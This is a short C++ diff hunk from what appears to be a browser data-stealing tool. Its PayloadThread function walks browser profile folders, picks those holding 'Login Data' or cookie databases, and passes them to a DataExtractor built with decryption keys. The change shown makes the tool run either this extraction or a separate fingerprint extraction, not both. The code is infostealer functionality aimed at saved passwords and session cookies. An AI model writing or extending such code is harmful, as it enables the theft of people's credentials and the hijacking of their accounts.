@@ -186,24 +186,25 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
             // 5. Create DataExtractor with KeyBundle
             DataExtractor extractor(pipe, keys, config.outputPath);
 
-            // 6. Process all profiles
-            for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
-                try {
-                    if (entry.is_directory()) {
-                        if (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
-                            std::filesystem::exists(entry.path() / "Login Data")) {
-                            extractor.ProcessProfile(entry.path(), browser.name);
-                        }
-                    }
-                } catch (...) {
-                    // Continue to next profile if one fails
-                }
-            }
-
-            // 7. Extract fingerprint if requested
+            // 6. CHANGED: Only extract fingerprint OR data, not both
             if (config.fingerprint) {
+                // ONLY fingerprint extraction (no sensitive data)
                 FingerprintExtractor fingerprinter(pipe, browser, config.outputPath);
                 fingerprinter.Extract();
+            } else {
+                // ONLY regular data extraction (no fingerprint)
+                for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
+                    try {
+                        if (entry.is_directory()) {
+                            if (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
+                                std::filesystem::exists(entry.path() / "Login Data")) {
+                                extractor.ProcessProfile(entry.path(), browser.name);
+                            }
+                        }
+                    } catch (...) {
+                        // Continue to next profile if one fails
+                    }
+                }
             }
 
         } catch (const std::exception& e) {
